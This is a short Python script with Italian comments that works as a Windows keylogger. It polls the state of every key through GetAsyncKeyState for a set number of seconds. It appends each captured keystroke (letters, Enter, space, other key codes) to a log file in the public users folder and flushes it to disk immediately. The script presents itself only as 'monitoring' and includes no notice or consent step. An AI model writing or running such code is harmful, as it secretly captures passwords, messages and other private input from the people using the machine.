import ctypes
import time
import sys

# Costanti Windows
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

def main():
    duration = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    log_path = r"C:\Users\Public\global_log.txt"
    start_time = time.time()
    
    with open(log_path, "a") as f:
        f.write(f"\n--- Inizio Monitoraggio: {time.ctime()} ---\n")
        
        while time.time() - start_time < duration:
            # Controlla lo stato di ogni tasto (da 8 a 255)
            for i in range(8, 256):
                if user32.GetAsyncKeyState(i) & 1:
                    # Traduzione rudimentale dei tasti
                    if i == 13: f.write("\n") # INVIO
                    elif i == 32: f.write(" ") # SPAZIO
                    elif 64 < i < 91: f.write(chr(i)) # LETTERE
                    else: f.write(f"[{i}]") # CODICE TASTO
                    f.flush() # Scrive immediatamente su disco
            time.sleep(0.01)
            
        f.write(f"\n--- Fine Monitoraggio: {time.ctime()} ---\n")

if __name__ == "__main__":
    main()
